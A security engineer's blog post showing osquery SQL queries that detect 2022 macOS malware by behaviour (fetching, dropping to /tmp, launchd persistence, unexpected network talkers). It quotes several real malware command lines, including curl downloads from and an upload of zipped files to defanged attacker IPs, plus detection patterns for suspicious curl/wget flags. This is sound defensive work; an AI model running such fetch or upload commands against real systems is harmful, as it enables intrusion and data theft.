
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Behavioral detection of macOS malware using osquery | choosehappy.dev</title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="alternate" type="application/atom+xml" title="choosehappy.dev RSS Feed" href="/feed.xml">
</head>
<body>
  <header>
    <nav>
      <div class="nav-left">
        <div class="site-title">☀️ <a href="/">choosehappy.dev</a></div>
        <div class="site-desc">thomas strömberg's happy little corner of the internet.</div>
      </div>
      <ul class="nav-right">
        <li><a href="/about">about</a></li>
        <li><a href="/posts">posts</a></li>
        <li><a href="https://www.linkedin.com/in/thomas-str%C3%B6mberg-9977261/">linkedin</a></li>
        <li><a href="https://triangletoot.party/@thomrstrom">mastodon</a></li>
        <li><a href="/feed.xml" title="RSS Feed">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M3.429 14.25c1.04 0 1.92.35 2.64 1.05.72.7 1.08 1.58 1.08 2.64 0 1.04-.36 1.92-1.08 2.64-.72.72-1.6 1.08-2.64 1.08-1.06 0-1.94-.36-2.64-1.08-.7-.72-1.05-1.6-1.05-2.64 0-1.06.35-1.94 1.05-2.64.7-.7 1.58-1.05 2.64-1.05zm0-4.5c2.32 0 4.42.87 6.3 2.61 1.88 1.74 2.82 3.9 2.82 6.48h-3.15c0-1.64-.6-3.05-1.8-4.23-1.2-1.18-2.62-1.77-4.26-1.77V9.75zm0-4.5c3.71 0 6.9 1.35 9.57 4.05 2.67 2.7 4.01 5.94 4.01 9.72h-3.15c0-2.88-1.05-5.37-3.15-7.47-2.1-2.1-4.59-3.15-7.47-3.15V5.25z"/>
          </svg>
        </a></li>
      </ul>
    </nav>
  </header>

  
<article>
  <h1>Behavioral detection of macOS malware using osquery</h1>
  <div class="post-meta">
    <p>Published on January 9, 2023</p>
  </div>
  <p><img src="HrCc01yk.jpg" alt=""></p>
<p>As part of my duties at <a href="https://chainguard.dev/">Chainguard</a>, I maintain an osquery based detection pipeline. As an open-source first company, we naturally open-sourced our production queries as part of the <a href="https://github.com/chainguard-dev/osquery-defense-kit">osquery-defense-kit</a>. When new Malware reports are released, I'll typically consume them to gather ideas for improving the effectiveness of our queries.</p>
<p>With the new year upon us, Objective See recently published a <a href="https://objective-see.org/blog/blog_0x71.html">retrospective report on the most interesting Mac Malware of 2022</a>. This was an excellent opportunity to review the evidence to see which queries are the most effective. I am additionally thankful that Objective See publishes Malware binaries for additional review, as some of the evidence this report relies on had to be extracted from the original binaries.</p>
<!--more-->
<h2>Which queries found which Malware?</h2>
<p>These are the top alerts from the <a href="https://github.com/chainguard-dev/osquery-defense-kit">osquery-defense-kit</a> that you should expect to fire if one of these Malware packages from the report are running on a host:</p>
<table>
<thead>
<tr>
<th>Malware</th>
<th>Talkers</th>
<th>ExecDir</th>
<th>New Executable</th>
<th>Launchd Arguments</th>
<th>Shell Parents</th>
<th>Sketchy Fetchers</th>
<th>Tmp Executables</th>
<th>Fetcher Parents</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.intezer.com/blog/incident-response/new-backdoor-sysjoker/">SysJoker</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/">DazzleSpy</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td></td>
</tr>
<tr>
<td><a href="https://www.trendmicro.com/en_us/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network.html">Coinminer</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td></td>
</tr>
<tr>
<td><a href="https://www.volexity.com/blog/2022/03/22/storm-cloud-on-the-horizon-gimmick-malware-strikes-at-macos/">GIMMICK</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
</tr>
<tr>
<td><a href="https://www.trendmicro.com/en_us/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html">oRat</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td><a href="https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/">CrateDepression</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td><a href="https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux">pymafka</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
</tr>
<tr>
<td><a href="https://www.sentinelone.com/blog/from-the-front-lines-new-macos-covid-malware-masquerades-as-apple-wears-face-of-apt/">VPN Trojan (Covid)</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/?utm_source=twitter&amp;utm_medium=cpc&amp;utm_campaign=wls&amp;utm_term=macos-spyware">CloudMensis</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://www.trendmicro.com/pl_pl/research/22/h/irontiger-compromises-chat-app-Mimi-targets-windows-mac-linux-users.html">rShell (Mimi)</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td></td>
<td>Y</td>
<td></td>
</tr>
<tr>
<td><a href="https://blog.talosintelligence.com/alchimist-offensive-framework/">Insekt</a></td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td></td>
<td></td>
<td></td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td><a href="https://www.trendmicro.com/en_us/research/22/k/pilfered-keys-free-app-infected-by-malware-steals-keychain-data.html">KeySteal</a></td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk">SentinelSneak</a></td>
<td>Y</td>
<td></td>
<td></td>
<td></td>
<td>Y</td>
<td>Y</td>
<td></td>
<td>Y</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>Other queries that you should expect to see triggered are: <code>exotic-commands</code>, <code>unexpected-library-entries</code>, and <code>fake-apple-launchd-entries</code>.</p>
<h2>Generically detecting Malware via behavior analysis</h2>
<p>Almost uniformly, an intrusion on a macOS or Linux host is going to go through the following steps:</p>
<ul>
<li>Fetch: Get a program to install from an external source</li>
<li>Drop: Place a program in a known writeable location within the filesystem</li>
<li>Prepare: Modify the execution settings of that program (chmod +x, xattr -c)</li>
<li>Execute: Run the newly installed program</li>
<li>Persist: Configure persistence for that program across reboots</li>
<li>Communicate: Contact an external host via TCP/IP</li>
</ul>
<p>Looking back at our table of matching queries, they all map to one of these stages. Let's dive into each of these stages and see what each query is doing under the hood.</p>
<h2>Fetch: Finding Sketchy Fetchers</h2>
<p>This is one of my personal favorite queries. The first step in nearly every
infection is to download additional stages, and the most popular way to do this without any additional code is <a href="https://curl.se/">curl</a>.</p>
<p>When an attacker invokes curl, they typically do so with quirks that make it stand out from other callers:</p>
<ul>
<li><code>-k</code> is used to turn off SSL validation</li>
<li>Flags such as <code>--connect-timeout</code> are often used to improve reliability on poor connections</li>
<li>Non-standard ports are used</li>
<li>The target is often an IP</li>
<li>When the target is DNS, it is often in an atypical TLD</li>
<li>Rarely, but occasionally runs curl or wget as root</li>
</ul>
<p>Can you combine all these quirks into a single query? The answer is yes!</p>
<pre><code class="language-sql">SELECT
  pe.pid,
  TRIM(pe.cmdline),
  REGEX_MATCH (pe.cmdline, '(\w+:\/\/.*)\b', 1) AS url,
  REGEX_MATCH (pe.cmdline, '//(\d+\.\d+\.\d+\.\d+)[:/]', 1) AS ip,
  REGEX_MATCH (pe.cmdline, ':(\d+)', 1) AS port,
  REGEX_MATCH (pe.cmdline, '//([\w\-\.]+)[:/]', 1) AS addr,
  REGEX_MATCH (pe.cmdline, '//[\w\-\.]+\.(\w+)[:/]', 1) AS tld,
  pe.cwd,
  pe.euid,
  p.cgroup_path,
  pp.path AS parent_path,
  TRIM(pp.cmdline) AS parent_cmdline
FROM
  process_events pe
  LEFT JOIN processes p ON pe.pid = p.pid
  LEFT JOIN processes pp ON pe.parent = pp.pid
WHERE
  pe.time &gt; (strftime('%s', 'now') -86400)
  AND (
    INSTR(pe.cmdline, 'wget ') &gt; 0
    OR INSTR(pe.cmdline, 'curl ') &gt; 0
  )
  AND (
    ip NOT IN ('', '127.0.0.1', '::1')
    OR port != ''
    OR tld NOT IN (
      '',
      'app',
      'ca',
      'cloud',
      'com',
      'de',
      'dev',
      'edu',
      'fun',
      'gov',
      'io',
      'md',
      'mil',
      'net',
      'org',
      'se',
      'sh',
      'so',
      'uk'
    )
    OR pe.cmdline LIKE '%.onion%'
    OR pe.cmdline LIKE '%curl -k%'
    OR pe.cmdline LIKE '%curl -sL %'
    OR pe.cmdline LIKE '%curl%--connect-timeout%'
    OR pe.cmdline LIKE '%curl%--output /dev/null%'
    OR pe.cmdline LIKE '%curl%--O /dev/null%'
    OR pe.cmdline LIKE '%curl%--insecure%'
    OR pe.cmdline LIKE '%curl%-o-%'
    OR pe.cmdline LIKE '%wget %--user-agent%'
    OR pe.cmdline LIKE '%wget %--no-check-certificate%'
    OR pe.cmdline LIKE '%wget -nc%'
    OR pe.cmdline LIKE '%wget -t%'
    OR pe.euid &lt; 500
  )
</code></pre>
<p>The full query can be found here: <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/sketchy-fetcher-events.sql">sketchy-fetcher-events.sql</a>.</p>
<p>Here are some examples of how the macOS malware from 2022 is invoking fetchers in a way that matches the above query:</p>
<ul>
<li>Gimmick: <code>curl -o %s http://cgi1.apnic.net/cgi-bin/my-ip.php --connect-timeout 10 -m 20</code></li>
<li>pymafka: <code>curl -A O -o- -L http://39.107.154[.]72/env</code></li>
<li>SentinelSneak: <code>curl -k -F &quot;file=@&quot; &lt;zip&gt; https://54.254.189[.]27/api/v1/file/upload</code></li>
<li>oRAT: <code>curl -sL https://d.github[.]wiki/mac/darwinx64 -O</code></li>
</ul>
<p>It's worth noting that this query includes <code>processes.cgroup_path</code>, which can be useful to filter out containerized applications on Linux, as they will often be run from lower euids.</p>
<h2>Drop: Executables in temporary directories</h2>
<p>It's very rare for executables to be found in <code>/tmp</code> or <code>/var/tmp</code>, particularly on macOS; the former is deleted on reboot. It is however popular for Malware to store binaries here, as it is reliably writeable across UNIX platforms, as folks rarely poke around these folders.</p>
<p>In the examples we examined above, there are a few examples:</p>
<ul>
<li>pymafka: <code>/var/tmp/zad</code></li>
<li>CoinMiner: <code>/tmp/lauth</code></li>
<li>DazzleSpy: <code>/tmp/airportpaird</code></li>
<li>CrateDepression: <code>/tmp/git-updater.bin</code></li>
<li>MiMi: <code>/tmp/rshell</code></li>
<li>Alchimist: <code>/tmp/Res/Payload</code></li>
<li>Gimmick: <code>/tmp/*</code></li>
</ul>
<p>Here's a query that should find all of those examples and more:</p>
<pre><code class="language-sql">SELECT
  file.path,
  uid,
  gid,
  mode,
  REGEX_MATCH (RTRIM(file.path, '/'), '.*\.(.*?)$', 1) AS extension,
  file.mtime,
  file.size,
  hash.sha256,
  magic.data
FROM
  file
  LEFT JOIN hash on file.path = hash.path
  LEFT JOIN magic ON file.path = magic.path
WHERE
  (
    file.directory = '/tmp' OR
    file.directory LIKE '/tmp/%%'
    file.directory = '/var/tmp' OR
    file.directory LIKE '/var/tmp/%%'
  )
  AND file.type = 'regular'
  AND size &gt; 10
  -- Don't alert if the file is only on disk for a moment
  AND (strftime('%s', 'now') - ctime) &gt; 30
  AND (
    file.mode LIKE '%7%'
    or file.mode LIKE '%5%'
    or file.mode LIKE '%1%'
  )
  -- macOS updates
  AND NOT file.directory LIKE '/tmp/msu-target-%'
  -- Other programs
  AND NOT file.path LIKE '/tmp/ko/bin/%'
  AND NOT extension IN ('sh', 'json')
  AND NOT file.name IN ('configure', 'mkinstalldirs')
</code></pre>
<p>If you have developers, you may need to tune this carefully, as they will occasionally extract source code into /tmp and build code there if it is disposable. This behavior appears more common with Linux developers than macOS developers.</p>
<h2>Execute: Unexpected Executable Directory</h2>
<p>Malware typically drops an initial program in a known writeable directory that is not easily noticed. Malware authors rarely choose directories where other binaries are already installed. The gist of this query is: to detect which programs are running from places we don't usually see programs running from.</p>
<pre><code class="language-sql">SELECT
  p.pid,
  p.name,
  p.path,
  p.euid,
  p.gid,
  f.ctime,
  f.directory AS dir,
  REGEX_MATCH (
    REPLACE(f.directory, u.directory, '~'),
    '(~/.*?/)',
    1
  ) AS top_homedir, -- 1 level deep
  p.cmdline,
  signature.identifier,
  signature.authority
FROM
  processes p
  LEFT JOIN file f ON p.path = f.path
  LEFT JOIN users u ON p.uid = u.uid
  LEFT JOIN signature ON p.path = signature.path
WHERE
  dir NOT IN (
    '/bin',
    '/opt/usr/bin',
    '/opt/X11/bin',
    '/opt/X11/libexec',
    '/sbin',
    '/usr/bin',
    '/usr/lib',
    '/usr/lib/bluetooth',
    '/usr/lib/cups/notifier',
    '/usr/libexec',
    '/usr/libexec/ApplicationFirewall',
    '/usr/libexec/AssetCache',
    '/usr/libexec/firmwarecheckers',
    '/usr/libexec/firmwarecheckers/eficheck',
    '/usr/libexec/rosetta',
    '/usr/lib/fwupd',
    '/usr/lib/ibus',
    '/usr/lib/system',
    '/usr/local/bin',
    '/usr/sbin'
  )
  AND top_homedir NOT IN (
    '~/Applications/',
    '~/Applications (Parallels)/',
    '~/go/',
    '~/bin/'
  )
  AND dir NOT LIKE '/Applications/%'
  -- Allow these anywhere (put last because it's slow to query signatures)
  AND signature.authority NOT IN (
    'Apple iPhone OS Application Signing',
    'Apple Mac OS Application Signing',
    'Developer ID Application: Adobe Inc. (JQ525L2MZD)',
    'Software Signing'
  )
</code></pre>
<p>This query is low maintenance, but if you have a lot of developers, you may find yourself adding more home directory or temp directory exceptions. For an event-based version of this query, see <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/unexpected-execdir-events-macos.sql">execution/unexpected-execdir-events-macos.sql</a>.</p>
<h2>Execute: Unexpected New Executable</h2>
<p>Malware will typically execute a program as soon as it hits the disk. It's pretty easy to write a query to see
which software was executed shortly after the executable birth time (btime) or inode change time (ctime).</p>
<p>Here's a basic query you can use to see which programs were started within 2 minutes (120 seconds) of being installed and were started in the last day (86400 seconds).</p>
<pre><code class="language-sql">SELECT
  p.pid,
  p.path,
  p.name,
  p.cmdline,
  p.cwd,
  p.euid,
  p.parent,
  f.directory,
  f.ctime,
  f.btime,
  f.mtime,
  p.start_time,
  signature.authority,
  signature.identifier
FROM
  processes p
  LEFT JOIN file f ON p.path = f.path
  LEFT JOIN signature ON p.path = signature.path
WHERE
  p.start_time &gt; 0
  AND f.ctime &gt; 0
  AND p.start_time &gt; (strftime('%s', 'now') - 86400)
  AND (p.start_time - MAX(f.ctime, f.btime)) &lt; 120
  AND p.start_time &gt;= MAX(f.ctime, f.ctime)
  AND signature.authority NOT IN (
    'Apple Mac OS Application Signing',
    'Developer ID Application: Adobe Inc. (JQ525L2MZD)',
    'Software Signing'
  )
  AND NOT p.path LIKE '/Applications/%.app/%'
  AND NOT (
    p.path LIKE '/Users/%'
    AND p.uid &gt; 499
    AND f.ctime = f.mtime
    AND f.uid = p.uid
    AND p.cmdline LIKE './%'
  )
 GROUP BY
  p.pid
</code></pre>
<p>The false positives you typically see here are auto-updating software like Google Chrome. Before deploying this query, you'll want to update the list of
signature authorities you feel comfortable with. For the full query source, see <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/unexpected-execdir-macos.sql">execution/unexpected-execdir-macos.sql</a>, and for the event-based version, see <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/unexpected-execdir-events-macos.sql">unexpected-execdir-events-macos.sql</a></p>
<h2>Execute: Unexpected Shell Parents</h2>
<p>Malware will typically allow for command execution within a shell, which is
not something most software does. The path to the shell used may differ between Malware, but they typically fall into two camps:</p>
<ul>
<li><code>/bin/bash</code>: Mentioned by CloudMensis, DazzleSpy, Gimmick, oRAT, rShell</li>
<li><code>/bin/sh</code>: Mentioned by CloudMensis, DazzleSpy, Insekt, KeySteal, oRAT</li>
<li><code>bash</code>: Mentioned by pymafka (no path!)</li>
</ul>
<p>If you maintain a list of programs you expect to launch a shell you can detect some exciting things. You can also get a bit more specific, by detecting particular flags such as <code>-s' (pymafka) and </code>-c` (SentinelSneak), but you are likely to miss many other types of execution.</p>
<p>Here's an example base query, using process_events (backwards looking):</p>
<pre><code class="language-sql">SELECT
  pe.path AS child_path,
  pe.pid,
  REGEX_MATCH (pe.path, '.*/(.*)', 1) AS child_name,
  TRIM(pe.cmdline) AS child_cmd,
  pe.parent AS parent_pid,
  TRIM(IIF(pp.cmdline != NULL, pp.cmdline, ppe.cmdline)) AS parent_cmd,
  TRIM(IIF(pp.path != NULL, pp.path, ppe.path)) AS parent_path,
  REGEX_MATCH (
    IIF(pp.path != NULL, pp.path, ppe.path),
    '.*/(.*)',
    1
  ) AS parent_name
FROM
  process_events pe
  LEFT JOIN processes p ON pe.pid = p.pid
  LEFT JOIN processes pp ON pe.parent = pp.pid
  LEFT JOIN process_events ppe ON pe.parent = ppe.pid
WHERE
  pe.path IN ('/bin/bash', '/bin/sh')
  AND pe.time &gt; (strftime('%s', 'now') -600)
  AND NOT parent_pid = -1
  AND NOT (
    parent_name IN (
      'zsh',
      'kubectl',
      'sudo',
      'bash',
      'sh',
      'git'
    )
    OR child_cmd IN (
      'sh -c python3.7 --version 2&gt;&amp;1',
      'sh -c xcode-select --print-path &gt;/dev/null 2&gt;&amp;1 &amp;&amp; xcrun --sdk macosx --show-sdk-path 2&gt;/dev/null'
    )
  )
GROUP BY
  pe.pid
</code></pre>
<p>We do some gymnastics in the above query to determine the name of the parent process: and preferring the name of active processes over past processes in the process_events table. We also use TRIM() as osquery often includes trailing spaces in <code>process_events</code> table.</p>
<p>For the full source code, see <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/initial_access/unexpected-shell-parent-events.sql">initial_access/unexpected-shell-parent-events.sql)</a></p>
<h2>Persistence: Launchd Program Arguments</h2>
<p>While there are numerous ways to configure a program to launch after reboots, <a href="https://www.launchd.info/">launchd</a> is by far the most popular method on macOS. This is even the case for Malware, so you should be auditing any unknown launchd users.</p>
<p>While the osquery-defense-toolkit has many launchd related queries, we're going to focus on <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/persistence/unexpected-launchd-program-arguments.sql">unexpected-launchd-program-arguments.sql)</a> here because it would have caught 2/3rds of the Malware we covered. Here's a simplified version of the query:</p>
<pre><code class="language-sql">SELECT
  l.label,
  l.name,
  l.path,
  TRIM(REGEX_SPLIT (l.program_arguments, ' -', 0)) AS program_path,
  l.program_arguments,
  l.keep_alive,
  signature.authority AS program_authority,
  hash.sha256
FROM
  launchd l
  LEFT JOIN signature ON program_path = signature.path
  LEFT JOIN hash ON program_path = hash.path
WHERE
  (
    run_at_load = 1
    OR keep_alive = 1
  )
  AND (
    program IS NULL
    OR program = ''
  )
  AND l.path NOT LIKE '/System/%'
  AND program_authority NOT IN (
    'Developer ID Application: Microsoft Corporation (UBF8T346G9)',
    'Software Signing'
  )
  AND program_arguments NOT IN (
    '/opt/homebrew/opt/mariadb/bin/mysqld_safe',
    '/opt/homebrew/opt/skhd/bin/skhd',
  )
</code></pre>
<p>This is a low-maintenance query, only requiring periodic maintenance of the list of acceptable program authorities. There is a carve out at the end to list acceptable arguments from unsigned launchd entries, such as what you may see with Homebrew.</p>
<p>It's worth noting that programs may choose to configure themselves using <code>launchd.program</code> instead of <code>launchd.program_arguments</code>, but that method is less flexible as does not allow for flags to be passed and thus does not seem to b popular with Malware authors. For an example of detecting launchd programs that do not use arguments, see <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/persistence/unexpected-launchd-program.sql">unexpected-launchd-program.sql</a></p>
<h2>Communications: Unexpected Talkers</h2>
<p>The root of this query is: to know which programs talk to whom on your network. On macOS, you can use binary signatures to confidently disambiguate between software packages than install locations. You can see the full query source at <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/c2/unexpected-talkers-macos.sql">c2/unexpected-talkers-macos.sql</a>, but this is the base:</p>
<pre><code class="language-sql">SELECT
  protocol,
  s.local_port,
  s.remote_port,
  s.remote_address,
  p.name,
  p.path,
  p.cmdline AS child_cmd,
  p.cwd,
  s.pid,
  p.parent AS parent_pid,
  pp.path AS parent_path,
  pp.cmdline AS parent_cmd,
  CONCAT (
    MIN(s.remote_port, 32768),
    ',',
    protocol,
    ',',
    MIN(p.uid, 500),
    ',',
    p.name,
    ',',
    signature.identifier,
    ',',
    signature.authority
  ) AS exception_key
FROM
  process_open_sockets s
  LEFT JOIN processes p ON s.pid = p.pid
  LEFT JOIN processes pp ON pp.pid = p.parent
  LEFT JOIN signature ON p.path = signature.path
WHERE
  protocol &gt; 0
  AND s.remote_port &gt; 0
  -- Not apple software
  AND NOT (
    signature.identifier LIKE 'com.apple.%'
    AND signature.authority = 'Software Signing'
    AND remote_port IN (53, 443, 80)
    AND protocol IN (6, 17)
  )
  AND NOT exception_key IN (
    '22,6,500,Cyberduck,ch.sudo.cyberduck,Developer ID Application: David Kocher (G69SCX94XU)',
    '443,6,0,Install,com.adobe.Install,Developer ID Application: Adobe Inc. (JQ525L2MZD)',
    '22,6,500,ssh,com.apple.openssh,Software Signing'
  )
</code></pre>
<p>The first time you run this query, prepare to feel overwhelmed by all the non-Apple applications you see on the network. The technique I've found useful to build up a list of exceptions is to dump all the results to a programmatic form (CSV, JSON), sort and unique them, and autogenerate the correct syntax to include them into the SQL query.</p>
<p>The calls to <code>MIN()</code> are to disambiguate between root and non-root UIDs and ephemeral port ranges.</p>
<p>One important caveat about the above query is that it uses <code>process_open_sockets</code>, which only shows currently open connections, rather than <code>socket_events</code> which allows you to inspect recent events. This means that there is potentially a race condition in which you may not see the talker if it has already closed the connection. For a backward-looking version of this query, try something like:</p>
<pre><code class="language-sql">SELECT
  protocol,
  s.local_port,
  s.remote_port,
  s.remote_address,
  p.name,
  p.path,
  p.cmdline AS child_cmd,
  p.cwd,
  s.pid,
  p.parent AS parent_pid,
  pp.path AS parent_path,
  pp.cmdline AS parent_cmd,
  CONCAT (
    MIN(s.remote_port, 32768),
    ',',
    MIN(p.uid, 500),
    ',',
    p.name,
    ',',
    signature.identifier,
    ',',
    signature.authority
  ) AS exception_key
FROM
  socket_events s
  LEFT JOIN processes p ON s.pid = p.pid
  LEFT JOIN processes pp ON pp.pid = p.parent
  LEFT JOIN signature ON p.path = signature.path
WHERE s.remote_port &gt; 0
AND s.time &gt; (strftime('%s', 'now') -600)
  AND NOT (
    signature.identifier LIKE 'com.apple.%'
    AND signature.authority = 'Software Signing'
    AND remote_port IN (53, 443, 80)
    AND protocol IN (6, 17)
  )
  AND NOT exception_key IN (
    '22,6,500,Cyberduck,ch.sudo.cyberduck,Developer ID Application: David Kocher (G69SCX94XU)',
    '443,6,0,Install,com.adobe.Install,Developer ID Application: Adobe Inc. (JQ525L2MZD)',
    '22,6,500,ssh,com.apple.openssh,Software Signing'
  )
</code></pre>
<p>On my osquery installation, <code>socket_events.protocol</code> is always NULL, so I've omitted it in the second query.</p>
<p>One optimization we use in the full version of <a href="https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/c2/unexpected-talkers-macos.sql">c2/unexpected-talkers-macos.sql</a> is skipping SIP-protected paths. Checking the signatures of every binary is expensive, so as a performance optimization, we skip the paths that cannot normally be written to.</p>
<p>Some applications are less predictable when it comes to outgoing ports to use, for example: web browsers or SyncThing. For those
you may want to craft more targetted logic than relying on <code>exception_key</code>.</p>
<p>Expect this query to require a bit of maintenance: updating the list of entries weekly or daily. To make it easier to maintain, consider splitting out a list of HTTP/HTTPS talkers from the rest, as those protocols make up the bulk of communications on macOS. To further lower the maintenance burden, you could also have an exception list of &quot;These signers can do whatever they want&quot;.</p>
<h2>Follow-ups</h2>
<p>While reviewing the evidence, several other possibilities for detection arose:</p>
<ul>
<li>Calls to 'chmod +x' or other variants: nearly universal across Malware samples</li>
<li>Unexpected programs that link against SecurityFramework: GIMMICK, oRAT, CloudMensis, Covid, KeySteal</li>
<li>Unexpected programs that link against SystemConfiguration.framework: GIMMICK, CloudMensis, DazzleSpy</li>
<li>Unexpected calls to launchctl load: CloudMensis, CoinMiner, DazzleSpy, GIMMICK, KeySteal</li>
<li>Unexpected .pkg signers: oRAT, KeySteal</li>
<li>Unexpected calls to xattr -c: CloudMensis, KeyStealer</li>
<li>Unexpected programs that link against libcurl: SysJoker</li>
<li>Processes running with unexpected extensions (.ts): SysJoker</li>
<li>Unexpected contents within /var/root: SysJoker, GIMMICK</li>
<li>Unexpected executables within /Library: SysJoker</li>
<li>Fake Adobe Launchd Services: Coinminer</li>
<li>XMRig process arguments: Coinminer</li>
<li>Calls to bash -s (stdin): pymafka</li>
<li>Programs named &quot;MacOs&quot; (bad case): SysJoker, Pymafka</li>
</ul>
<p>With any luck, some of these detection ideas will land in the osquery-defense-kit in the coming weeks. Help wanted!</p>
<h2>Other weird things I noticed</h2>
<ul>
<li>DazzleSpy specifically references <code>/Volumes/GRMCPRXFRER_CN_DVD</code> (Windows 7 SP1  DVD ISO)</li>
<li>DazzleSpy references <code>/private/var/log/fsck_hfs.log</code> - which seems like a weird log to exfiltrato.</li>
<li>oRat doesn't have an obvious built-in persistence mechanism, though that may be deployed in a subsequent payload.</li>
<li>VPN Trojan (Covid) references <code>enableReLaunchOnLogin</code>, but doesn't have a known persistence mechanism.</li>
<li>CloudMensis includes ancient Safari escapes: <a href="https://github.com/maximehip/Safari-iOS10.3.2-macOS-10.12.4-exploit-Bugs/blob/master/Makefile">https://github.com/maximehip/Safari-iOS10.3.2-macOS-10.12.4-exploit-Bugs/blob/master/Makefile</a></li>
<li>CloudMensis references files I haven't seen mentioned before: <code>/Users/%/Library/Logs/imis.log</code> (possibly just a typo for ims.log), and <code>/Library/Application Support/Apple/Fonts/iWork/.Standard.ttc</code></li>
<li>CloudMensis contains some interesting calls to launchctl, such as &quot;launchctl setenv HOME&quot;. This appears to be related to a TCC bypass for CVE-2020–9934.</li>
<li>Insekt has references to the pkexec exploit (Linux). Specifically, <code>/Users/woody/Downloads/vul/poc-cve-2021-4034-main/exploit.go</code></li>
</ul>
<p>Do let me know if you found this post useful!</p>

</article>


</body>
</html>
